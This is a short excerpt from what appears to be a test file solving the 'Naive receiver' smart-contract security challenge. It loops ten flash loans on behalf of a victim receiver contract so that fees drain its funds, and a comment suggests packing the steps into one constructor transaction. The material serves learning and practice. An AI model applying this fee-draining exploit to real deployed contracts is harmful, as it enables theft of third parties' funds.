...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Execution", async function () {
    ...
    /*
        We can create a contract that does 10 flash loans 
        And we call that contract only once
        But with the deployment transaction we have still had two transactions not one
        We can do this in the contracts constructor and then we only have one transaction
    */
    const tokenAddress = await pool.ETH();
    for (let i = 0; i < 10; i++) {
      await pool
        .connect(user)
        .flashLoan(receiver.address, tokenAddress, ETHER_IN_RECEIVER, "0x");
    }
  });
